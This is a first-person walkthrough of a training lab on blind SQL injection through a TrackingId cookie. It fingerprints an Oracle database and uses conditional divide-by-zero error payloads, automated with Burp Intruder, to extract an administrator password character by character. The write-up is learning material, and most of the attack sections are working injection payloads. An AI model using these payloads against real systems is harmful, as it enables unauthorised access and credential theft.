# Lab 07: Blind SQL Injection with Conditional Errors

## Category

Blind SQL Injection - Conditional Errors

## Objective

Exploit a blind SQL injection vulnerability in the `TrackingId` cookie and recover the password of the `administrator` user by triggering database errors conditionally and seeing how the application will respond.

---

# Solution

## 1. Identifying the Injection Point

After intercepting a request in Burp Suite, I noticed that the application included a `TrackingId` cookie in every request.

To simplify Let's follow the portsowigger easy example:

```http
TrackingId=xyz
```

To see whether this value being handeled unsafely in a SQL query, I started with a simple test and added a single quotation mark to the cookie value.

```sql
TrackingId=xyz'
```

As soon as I sent the request, the application returned an error.

![Single quote causes an internal server error](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-01-single-quote-error.png)

Next, I added a second quotation mark:

```sql
TrackingId=xyz''
```

This time the error disappeared and the application behaved normally again.

![Double quote restores a normal response](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-02-double-quote-normal-response.png)

At this point, I knew the application was likely placing my input inside a SQL query. While breaking the query syntax had a visible effect on the response. That indicated that the parameter was vulnerable to SQL injection.

---

## 2. Identifying the Database

Before moving any further, I wanted to understand what database was running behind the application because different database engines behave differently and support different syntax.

I first tried the following payload:

```sql
TrackingId=xyz'||(SELECT '')||'
```

The application still returned an error.

At first I thought my syntax might be wrong, but then I remembered that Oracle requires every `SELECT` statement to reference a table.

To test that theory, I modified the payload and used Oracle's built-in `dual` table:


```sql
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

This time the error disappeared.

![Oracle query using the DUAL table returns normally](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-03-oracle-dual-table.png)

***As we said before the Oracle database needs to identify the table name each time we make a query***
That was a strong indication that the backend was using Oracle. Knowing the database type would be important later because it determined which functions and syntax I could use throughout the attack.

---

## 3. Confirming SQL Query Execution

Now that I had a better idea of the database, I wanted to make sure my input was actually being executed as SQL rather than simply breaking the application's logic.

To verify this, I intentionally referenced a table that should not exist.

```sql
TrackingId=xyz'||(SELECT '' FROM not_a_real_table)||'
```

The application immediately returned an error.

What I was really doing here was forcing Oracle to look up a table that doesn't exist. Since the application reflected the resulting database error back to me, this confirmed that:

- My payload was being interpreted as SQL.
- The database was executing my injected query.
- Database errors could be used to extract information.

---

## 4. Confirming the Users Table

After finding the injection point, the next thing I wanted to verify was whether the target table actually existed.

I used the following payload:

```sql
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

This time no error occurred.

Since Oracle was able to query the table successfully, I knew that the `users` table existed.

***Note: The `ROWNUM = 1` condition is important here because it ensures the query only returns a single row. Without that condition, the query could return multiple rows and break the string concatenation.***

At this point, I had successfully confirmed the existence of the table that likely contained our target data.

![Query confirms that the users table exists](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-04-users-table-exists.png)

---

## 5. Turning Database Errors into a True/False Signal

At this stage, I knew I could trigger database errors whenever I wanted. The next challenge was finding a way to make those errors appear only when a specific condition was true.

The idea was simple:

- If a condition is true, force Oracle to generate an error.
- If a condition is false, return a normal value.

That would effectively give me a yes/no signal that I could use to extract information from the database.

To test this, I used the following payload:

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN (1=1)
THEN TO_CHAR(1/0)
ELSE ''
END
FROM dual
)||'
```

Since `1=1` evaluates to true, Oracle executes:

```sql
TO_CHAR(1/0)
```

The division-by-zero operation generates an error, and the application returns an error response.

![A true condition causes a database error](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-05-true-condition-error.png)

Next, I changed the condition:

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN (1=2)
THEN TO_CHAR(1/0)
ELSE ''
END
FROM dual
)||'
```

This time no error appeared because the condition evaluated to false and Oracle executed the `ELSE` branch instead.

At this point, I had successfully turned database errors into a true/false indicator that I could use throughout the rest of the attack.

| Condition | Application Response |
|------------|------------|
| True | Error returned |
| False | No error returned |

![A false condition returns the page normally](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-06-false-condition-normal-response.png)

---

## 6. Confirming the Administrator Account

Before targeting the password, I wanted to make sure the `administrator` account actually existed.

I reused the same technique and added a condition that only executed if a row with the username `administrator` was returned.

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN (1=1)
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'
```

My first request returned a normal response, as shown below, so that attempt did not confirm the account on its own. I continued with the password-length check in the next step; its error response showed that the query found the administrator row.

![First administrator condition check returns a normal response](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-07-administrator-condition-check.png)

---

## 7. Determining the Password Length

My next goal was finding the length of the administrator's password. If the account existed and the password was longer than one character, this condition should make the application return an error.

Rather than trying to recover characters immediately, I first needed to know how many characters I was dealing with.

I started with:

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN LENGTH(password)>1
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'
```

The application returned an error, which meant the password length was greater than one.

![Password length greater than one triggers an error](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-08-password-length-greater-than-one.png)

I can continue increasing the value while observing whether the error still appeared.

Instead of manually repeating requests in Repeater, I found it much easier to use Burp Intruder.

### Payload Position

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN LENGTH(password)>§1§
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'
```

#### Attack Type ``Sniper``

#### Payloads ``1-20``

I simply looked for the point where the error stopped occurring.

From the results, I determined that the administrator password was:
``
20 characters long
``

![Intruder results show the password length](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-09-intruder-password-length.png)

---

## 8. Extracting the First Character

Once I knew the password length, I could start recovering it one character at a time.

To do that, I used Oracle's `SUBSTR()` function.

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN SUBSTR(password,1,1)='a'
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'
```

The idea behind this payload is straightforward.

First, Oracle retrieves the administrator's password.

Then it extracts a single character from position 1.

Finally, it compares that character with my guess.

If the guess is correct, Oracle executes the divide-by-zero operation and generates an error.

If the guess is wrong, Oracle executes the `ELSE` branch and the page loads normally.

In other words:

```text
Error = Correct Guess
No Error = Incorrect Guess
```

---

## 9. Automating Character Enumeration with Intruder

Testing every possible character manually would take forever, so I sent the request to Burp Intruder.

### Payload Position

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN SUBSTR(password,1,1)='§a§'
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'
```

### Attack Type
``
Sniper
``  

***Note: we can apply that using the Cluster Bomb Attack, see below***
### Payloads

``
a-z
``  
``
0-9
``

Since the lab mentions that the password only contains lowercase alphanumeric characters, this payload list covered every possible value.

---

## 10. Finding the Correct Character

After launching the attack, I reviewed the results generated by Intruder.

Unlike the previous conditional response lab where I searched for the phrase **Welcome back**, here I relied on the HTTP status code.

| Status Code | Meaning |
|------------|------------|
| 500 | Character is correct |
| 200 | Character is incorrect |

Whenever I spotted an HTTP 500 response, I knew that the payload character was the correct value for that position.

This made identifying characters extremely easy because the correct guess stood out immediately.

I also used to sort the results by there length which is very useful too.

![Intruder results highlight the correct password characters](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-10-intruder-character-results.png)

---

## 11. Recovering the Entire Password

After finding the first character, all I had to do was repeat the same process for the remaining positions.

For example, to test position 2:

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN SUBSTR(password,2,1)='§a§'
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'
```

Then continue to change the position until reaching offset 20.

---

## 12. Alternative Approach - Cluster Bomb

Another option would have been to use a single Cluster Bomb attack instead of running multiple Sniper attacks.

Although this approach is useful, I preferred to try the Cluster Bomb attack to save time. I set one payload position for the password character and another for its position.

![Cluster Bomb payload positions and character list](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-11-cluster-bomb-payload-setup.png)

After combining all discovered characters together, I reconstructed the administrator's password and successfully logged into the application.

![Administrator login succeeds and the lab is solved](../assets/SQL%20Injection/Lab%2007%20-%20Conditional%20Errors/step-12-administrator-login-success.png)

### Payload Template

```sql
TrackingId=xyz'||(
SELECT CASE
WHEN SUBSTR(password,§1§,1)='§a§'
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'
```

### Attack Type

```text
Cluster Bomb
```

### Payload Set 1 - Password Position

``
1-20
``

### Payload Set 2 - Character Set

``
a-z
``  
``
0-9
``

Burp combines every position with every possible character and generates all possible requests.

The rows returning HTTP 500 reveal the correct character for each position.

You can sort the results according to their length too.

> While Cluster Bomb seems better, it still has limitations in the burp suite community edition so you may need to use the sniper attack in this case, or plan to do other tasks while the attack is running in the background.

---

# A Bit of Theory

## What Makes This Blind SQL Injection?

In a traditional SQL injection attack, the application returns data directly from the database.

For example:

```sql
SELECT username
FROM users
WHERE id='1'
```

An attacker might inject:

```sql
' UNION SELECT username FROM users--
```

and immediately see usernames displayed on the page. see this lab.

In this lab, none of the database results were shown.

Instead, the application only revealed information indirectly through database errors.

That is why this is considered a **Blind SQL Injection** vulnerability. The data is still accessible, but it has to be extracted through indirect signals instead of direct output.

---

## Understanding Conditional Errors

The key idea behind this lab is using database errors as our signs.

Instead of asking the database to display the password, I repeatedly asked yes/no questions about the password.

Whenever my statement was true, Oracle generated an error.

Whenever it was false, the request completed normally.

That behavior can be summarized as:

| Condition | Result |
|------------|------------|
| True | Error |
| False | No Error |
| Correct Guess | HTTP 500 |
| Wrong Guess | HTTP 200 |

---

## Why the CASE Statement Works

The magic behind this technique is the `CASE` statement.

Consider:

```sql
SELECT CASE
WHEN (1=1)
THEN TO_CHAR(1/0)
ELSE ''
END
FROM dual
```

Oracle first evaluates the condition.

Because `1=1` is true, Oracle executes:

```sql
TO_CHAR(1/0)
```

The division-by-zero operation throws an exception and causes the application to return an error.

If the condition is false, Oracle skips the divide-by-zero operation and executes the `ELSE` branch instead.

This gives us a reliable way to turn any true condition into an observable error.

There we can replace the condition 1=1 by our targets wether an information about existing a character or the length of a password.

---

# What I Learned

- Identified a blind SQL injection vulnerability through database errors.
- Fingerprinted the backend database as Oracle.
- Learned why Oracle uses the `dual` table.
- Confirmed table and user existence through conditional queries.
- Determined password length using the `LENGTH()` function.
- Extracted password characters using the `SUBSTR()` function.
- Used `CASE WHEN` statements to trigger controlled database errors.
- Automated enumeration using Burp Intruder.
- Practiced both Sniper and Cluster Bomb attack types.
- Used error-based inference to recover sensitive data without seeing any direct database output.

---

# Tools

- Burp Suite
- Proxy
- Repeater
- Intruder
- Web Browser

---

# Result

✅ Confirmed the blind SQL injection vulnerability.

✅ Identified Oracle as the backend database.

✅ Verified the existence of the `users` table and the `administrator` account.

✅ Determined that the administrator password contained 20 characters.

✅ Successfully extracted the administrator password using conditional database errors.

✅ Authenticated as the administrator user.

✅ Lab solved successfully.
